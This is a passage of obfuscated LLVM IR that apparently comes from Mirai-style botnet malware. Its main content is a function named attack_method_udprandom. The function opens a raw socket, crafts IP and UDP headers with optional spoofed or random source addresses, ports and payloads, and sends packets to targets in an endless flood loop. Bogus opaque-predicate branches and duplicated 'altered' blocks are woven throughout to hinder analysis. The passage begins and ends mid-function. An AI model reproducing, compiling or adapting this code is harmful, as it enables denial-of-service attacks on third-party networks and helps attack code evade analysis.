originalBB70alteredBB:                            ; preds = %originalBB70, %446
  %690 = load i16, i16* %17, align 2
  %691 = zext i16 %690 to i32
  %692 = icmp eq i32 %691, 65535
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %580
  %693 = load i32, i32* %9, align 4
  %_75 = shl i32 %693, 1
  %_76 = shl i32 %693, 1
  %_77 = shl i32 %693, 1
  %694 = add nsw i32 %693, 1
  store i32 %694, i32* %9, align 4
  br label %originalBB74
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udprandom(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #6
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 1458)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  %70 = icmp sgt i32 %69, 1458
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %4
  store i16 1458, i16* %18, align 2
  br label %72

; <label>:72:                                     ; preds = %71, %4
  %73 = load i32, i32* @x.29
  %74 = load i32, i32* @y.30
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %72
  %81 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %81, i32* %10, align 4
  %82 = icmp eq i32 %81, -1
  %83 = load i32, i32* @x.29
  %84 = load i32, i32* @y.30
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %82, label %91, label %108

; <label>:91:                                     ; preds = %originalBBpart2
  %92 = load i32, i32* @x.29
  %93 = load i32, i32* @y.30
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %91
  %100 = load i32, i32* @x.29
  %101 = load i32, i32* @y.30
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %490

; <label>:108:                                    ; preds = %originalBBpart2
  %109 = load i32, i32* @x.29
  %110 = load i32, i32* @y.30
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %108
  store i32 1, i32* %9, align 4
  %117 = load i32, i32* %10, align 4
  %118 = bitcast i32* %9 to i8*
  %119 = call i32 @setsockopt(i32 %117, i32 0, i32 3, i8* %118, i32 4) #6
  %120 = icmp eq i32 %119, -1
  %121 = load i32, i32* @x.29
  %122 = load i32, i32* @y.30
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %120, label %129, label %132

; <label>:129:                                    ; preds = %originalBBpart28
  %130 = load i32, i32* %10, align 4
  %131 = call i32 @close(i32 %130)
  br label %490

; <label>:132:                                    ; preds = %originalBBpart28
  store i32 0, i32* %9, align 4
  br label %133

; <label>:133:                                    ; preds = %263, %132
  %134 = load i32, i32* @x.29
  %135 = load i32, i32* @y.30
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %133
  %142 = load i32, i32* %9, align 4
  %143 = load i8, i8* %5, align 1
  %144 = zext i8 %143 to i32
  %145 = icmp slt i32 %142, %144
  %146 = load i32, i32* @x.29
  %147 = load i32, i32* @y.30
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %145, label %154, label %266

; <label>:154:                                    ; preds = %originalBBpart212
  %155 = load i32, i32* @x.29
  %156 = load i32, i32* @y.30
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %154
  %163 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %164 = load i8**, i8*** %11, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds i8*, i8** %164, i64 %166
  store i8* %163, i8** %167, align 8
  %168 = load i8**, i8*** %11, align 8
  %169 = load i32, i32* %9, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i8*, i8** %168, i64 %170
  %172 = load i8*, i8** %171, align 8
  %173 = bitcast i8* %172 to %struct.iphdr*
  store %struct.iphdr* %173, %struct.iphdr** %21, align 8
  %174 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i64 1
  %176 = bitcast %struct.iphdr* %175 to %struct.udphdr*
  store %struct.udphdr* %176, %struct.udphdr** %22, align 8
  %177 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %178 = bitcast %struct.iphdr* %177 to i8*
  %179 = load i8, i8* %178, align 4
  %180 = and i8 %179, 15
  %181 = or i8 %180, 64
  store i8 %181, i8* %178, align 4
  %182 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %183 = bitcast %struct.iphdr* %182 to i8*
  %184 = load i8, i8* %183, align 4
  %185 = and i8 %184, -16
  %186 = or i8 %185, 5
  store i8 %186, i8* %183, align 4
  %187 = load i8, i8* %12, align 1
  %188 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 1
  store i8 %187, i8* %189, align 1
  %190 = load i16, i16* %18, align 2
  %191 = zext i16 %190 to i64
  %192 = add i64 28, %191
  %193 = trunc i64 %192 to i16
  %194 = call zeroext i16 @htons(i16 zeroext %193) #7
  %195 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %196 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %195, i32 0, i32 2
  store i16 %194, i16* %196, align 2
  %197 = load i16, i16* %13, align 2
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 3
  store i16 %198, i16* %200, align 4
  %201 = load i8, i8* %14, align 1
  %202 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 5
  store i8 %201, i8* %203, align 4
  %204 = load i8, i8* %15, align 1
  %205 = icmp ne i8 %204, 0
  %206 = load i32, i32* @x.29
  %207 = load i32, i32* @y.30
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBBpart249, label %originalBB14alteredBB

originalBBpart249:                                ; preds = %originalBB14
  br i1 %205, label %214, label %234

; <label>:214:                                    ; preds = %originalBBpart249
  %215 = load i32, i32* @x.29
  %216 = load i32, i32* @y.30
  %217 = sub i32 %215, 1
  %218 = mul i32 %215, %217
  %219 = urem i32 %218, 2
  %220 = icmp eq i32 %219, 0
  %221 = icmp slt i32 %216, 10
  %222 = or i1 %220, %221
  br i1 %222, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %214
  %223 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %224 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 4
  store i16 %223, i16* %225, align 2
  %226 = load i32, i32* @x.29
  %227 = load i32, i32* @y.30
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %234

; <label>:234:                                    ; preds = %originalBBpart253, %originalBBpart249
  %235 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %236 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %235, i32 0, i32 6
  store i8 17, i8* %236, align 1
  %237 = load i32, i32* %20, align 4
  %238 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %239 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %238, i32 0, i32 8
  store i32 %237, i32* %239, align 4
  %240 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %241 = load i32, i32* %9, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %240, i64 %242
  %244 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %243, i32 0, i32 1
  %245 = load i32, i32* %244, align 4
  %246 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %247 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %246, i32 0, i32 9
  store i32 %245, i32* %247, align 4
  %248 = load i16, i16* %16, align 2
  %249 = call zeroext i16 @htons(i16 zeroext %248) #7
  %250 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 0
  store i16 %249, i16* %251, align 2
  %252 = load i16, i16* %17, align 2
  %253 = call zeroext i16 @htons(i16 zeroext %252) #7
  %254 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %255 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %254, i32 0, i32 1
  store i16 %253, i16* %255, align 2
  %256 = load i16, i16* %18, align 2
  %257 = zext i16 %256 to i64
  %258 = add i64 8, %257
  %259 = trunc i64 %258 to i16
  %260 = call zeroext i16 @htons(i16 zeroext %259) #7
  %261 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %262 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %261, i32 0, i32 2
  store i16 %260, i16* %262, align 2
  br label %263

; <label>:263:                                    ; preds = %234
  %264 = load i32, i32* %9, align 4
  %265 = add nsw i32 %264, 1
  store i32 %265, i32* %9, align 4
  br label %133

; <label>:266:                                    ; preds = %originalBBpart212
  br label %267

; <label>:267:                                    ; preds = %489, %266
  store i32 0, i32* %9, align 4
  br label %268

; <label>:268:                                    ; preds = %486, %267
  %269 = load i32, i32* @x.29
  %270 = load i32, i32* @y.30
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %268
  %277 = load i32, i32* %9, align 4
  %278 = load i8, i8* %5, align 1
  %279 = zext i8 %278 to i32
  %280 = icmp slt i32 %277, %279
  %281 = load i32, i32* @x.29
  %282 = load i32, i32* @y.30
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br i1 %280, label %289, label %489

; <label>:289:                                    ; preds = %originalBBpart257
  %290 = load i8**, i8*** %11, align 8
  %291 = load i32, i32* %9, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds i8*, i8** %290, i64 %292
  %294 = load i8*, i8** %293, align 8
  store i8* %294, i8** %23, align 8
  %295 = load i8*, i8** %23, align 8
  %296 = bitcast i8* %295 to %struct.iphdr*
  store %struct.iphdr* %296, %struct.iphdr** %24, align 8
  %297 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %298 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %297, i64 1
  %299 = bitcast %struct.iphdr* %298 to %struct.udphdr*
  store %struct.udphdr* %299, %struct.udphdr** %25, align 8
  %300 = call i32 @rand() #6
  %301 = srem i32 %300, 4096
  %302 = add nsw i32 %301, 1
  %303 = sext i32 %302 to i64
  %304 = inttoptr i64 %303 to i8*
  store i8* %304, i8** %26, align 8
  %305 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %306 = load i32, i32* %9, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i64 %307
  %309 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %308, i32 0, i32 2
  %310 = load i8, i8* %309, align 4
  %311 = zext i8 %310 to i32
  %312 = icmp slt i32 %311, 32
  br i1 %312, label %313, label %334

; <label>:313:                                    ; preds = %289
  %314 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %315 = load i32, i32* %9, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i64 %316
  %318 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %317, i32 0, i32 1
  %319 = load i32, i32* %318, align 4
  %320 = call i32 @ntohl(i32 %319) #7
  %321 = call i32 @rand_next()
  %322 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %323 = load i32, i32* %9, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %322, i64 %324
  %326 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %325, i32 0, i32 2
  %327 = load i8, i8* %326, align 4
  %328 = zext i8 %327 to i32
  %329 = lshr i32 %321, %328
  %330 = add i32 %320, %329
  %331 = call i32 @htonl(i32 %330) #7
  %332 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %333 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %332, i32 0, i32 9
  store i32 %331, i32* %333, align 4
  br label %334

; <label>:334:                                    ; preds = %313, %289
  %335 = load i32, i32* %20, align 4
  %336 = icmp eq i32 %335, -1
  br i1 %336, label %337, label %341

; <label>:337:                                    ; preds = %334
  %338 = call i32 @rand_next()
  %339 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 8
  store i32 %338, i32* %340, align 4
  br label %341

; <label>:341:                                    ; preds = %337, %334
  %342 = load i32, i32* @x.29
  %343 = load i32, i32* @y.30
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %341
  %350 = load i16, i16* %13, align 2
  %351 = zext i16 %350 to i32
  %352 = icmp eq i32 %351, 65535
  %353 = load i32, i32* @x.29
  %354 = load i32, i32* @y.30
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br i1 %352, label %361, label %366

; <label>:361:                                    ; preds = %originalBBpart261
  %362 = call i32 @rand_next()
  %363 = trunc i32 %362 to i16
  %364 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %365 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %364, i32 0, i32 3
  store i16 %363, i16* %365, align 4
  br label %366

; <label>:366:                                    ; preds = %361, %originalBBpart261
  %367 = load i32, i32* @x.29
  %368 = load i32, i32* @y.30
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %366
  %375 = load i16, i16* %16, align 2
  %376 = zext i16 %375 to i32
  %377 = icmp eq i32 %376, 65535
  %378 = load i32, i32* @x.29
  %379 = load i32, i32* @y.30
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br i1 %377, label %386, label %391

; <label>:386:                                    ; preds = %originalBBpart265
  %387 = call i32 @rand_next()
  %388 = trunc i32 %387 to i16
  %389 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %390 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %389, i32 0, i32 0
  store i16 %388, i16* %390, align 2
  br label %391

; <label>:391:                                    ; preds = %386, %originalBBpart265
  %392 = load i16, i16* %17, align 2
  %393 = zext i16 %392 to i32
  %394 = icmp eq i32 %393, 65535
  br i1 %394, label %395, label %416

; <label>:395:                                    ; preds = %391
  %396 = load i32, i32* @x.29
  %397 = load i32, i32* @y.30
  %398 = sub i32 %396, 1
  %399 = mul i32 %396, %398
  %400 = urem i32 %399, 2
  %401 = icmp eq i32 %400, 0
  %402 = icmp slt i32 %397, 10
  %403 = or i1 %401, %402
  br i1 %403, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %395
  %404 = call i32 @rand_next()
  %405 = trunc i32 %404 to i16
  %406 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %407 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %406, i32 0, i32 1
  store i16 %405, i16* %407, align 2
  %408 = load i32, i32* @x.29
  %409 = load i32, i32* @y.30
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %416

; <label>:416:                                    ; preds = %originalBBpart269, %391
  %417 = load i32, i32* @x.29
  %418 = load i32, i32* @y.30
  %419 = sub i32 %417, 1
  %420 = mul i32 %417, %419
  %421 = urem i32 %420, 2
  %422 = icmp eq i32 %421, 0
  %423 = icmp slt i32 %418, 10
  %424 = or i1 %422, %423
  br i1 %424, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %416
  %425 = load i8, i8* %19, align 1
  %426 = icmp ne i8 %425, 0
  %427 = load i32, i32* @x.29
  %428 = load i32, i32* @y.30
  %429 = sub i32 %427, 1
  %430 = mul i32 %427, %429
  %431 = urem i32 %430, 2
  %432 = icmp eq i32 %431, 0
  %433 = icmp slt i32 %428, 10
  %434 = or i1 %432, %433
  br i1 %434, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br i1 %426, label %435, label %439

; <label>:435:                                    ; preds = %originalBBpart273
  %436 = load i8*, i8** %26, align 8
  %437 = load i16, i16* %18, align 2
  %438 = zext i16 %437 to i32
  call void @rand_str(i8* %436, i32 %438)
  br label %439

; <label>:439:                                    ; preds = %435, %originalBBpart273
  %440 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %441 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %440, i32 0, i32 7
  store i16 0, i16* %441, align 2
  %442 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %443 = bitcast %struct.iphdr* %442 to i16*
  %444 = call zeroext i16 @checksum_generic(i16* %443, i32 20)
  %445 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %446 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %445, i32 0, i32 7
  store i16 %444, i16* %446, align 2
  %447 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %448 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %447, i32 0, i32 3
  store i16 0, i16* %448, align 2
  %449 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %450 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %451 = bitcast %struct.udphdr* %450 to i8*
  %452 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %453 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %452, i32 0, i32 2
  %454 = load i16, i16* %453, align 2
  %455 = load i16, i16* %18, align 2
  %456 = zext i16 %455 to i64
  %457 = add i64 8, %456
  %458 = trunc i64 %457 to i32
  %459 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %449, i8* %451, i16 zeroext %454, i32 %458)
  %460 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %461 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %460, i32 0, i32 3
  store i16 %459, i16* %461, align 2
  %462 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %463 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %462, i32 0, i32 1
  %464 = load i16, i16* %463, align 2
  %465 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %466 = load i32, i32* %9, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %465, i64 %467
  %469 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %468, i32 0, i32 0
  %470 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %469, i32 0, i32 1
  store i16 %464, i16* %470, align 2
  %471 = load i32, i32* %10, align 4
  %472 = load i8*, i8** %23, align 8
  %473 = load i16, i16* %18, align 2
  %474 = zext i16 %473 to i64
  %475 = add i64 28, %474
  %476 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %477 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %478 = load i32, i32* %9, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %477, i64 %479
  %481 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %480, i32 0, i32 0
  %482 = bitcast %struct.sockaddr_in* %481 to %struct.sockaddr*
  store %struct.sockaddr* %482, %struct.sockaddr** %476, align 8
  %483 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %484 = load %struct.sockaddr*, %struct.sockaddr** %483, align 8
  %485 = call i64 @sendto(i32 %471, i8* %472, i64 %475, i32 16384, %struct.sockaddr* %484, i32 16)
  br label %486

; <label>:486:                                    ; preds = %439
  %487 = load i32, i32* %9, align 4
  %488 = add nsw i32 %487, 1
  store i32 %488, i32* %9, align 4
  br label %268

; <label>:489:                                    ; preds = %originalBBpart257
  br label %267

; <label>:490:                                    ; preds = %129, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %72
  %491 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %491, i32* %10, align 4
  %492 = icmp eq i32 %491, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %91
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %108
  store i32 1, i32* %9, align 4
  %493 = load i32, i32* %10, align 4
  %494 = bitcast i32* %9 to i8*
  %495 = call i32 @setsockopt(i32 %493, i32 0, i32 3, i8* %494, i32 4) #6
  %496 = icmp eq i32 %495, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %133
  %497 = load i32, i32* %9, align 4
  %498 = load i8, i8* %5, align 1
  %499 = zext i8 %498 to i32
  %500 = icmp slt i32 %497, %499
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %154
  %501 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %502 = load i8**, i8*** %11, align 8
  %503 = load i32, i32* %9, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds i8*, i8** %502, i64 %504
  store i8* %501, i8** %505, align 8
  %506 = load i8**, i8*** %11, align 8
  %507 = load i32, i32* %9, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds i8*, i8** %506, i64 %508
  %510 = load i8*, i8** %509, align 8
  %511 = bitcast i8* %510 to %struct.iphdr*
  store %struct.iphdr* %511, %struct.iphdr** %21, align 8
  %512 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %513 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %512, i64 1
  %514 = bitcast %struct.iphdr* %513 to %struct.udphdr*
  store %struct.udphdr* %514, %struct.udphdr** %22, align 8
  %515 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %516 = bitcast %struct.iphdr* %515 to i8*
  %517 = load i8, i8* %516, align 4
  %_ = sub i8 %517, 15
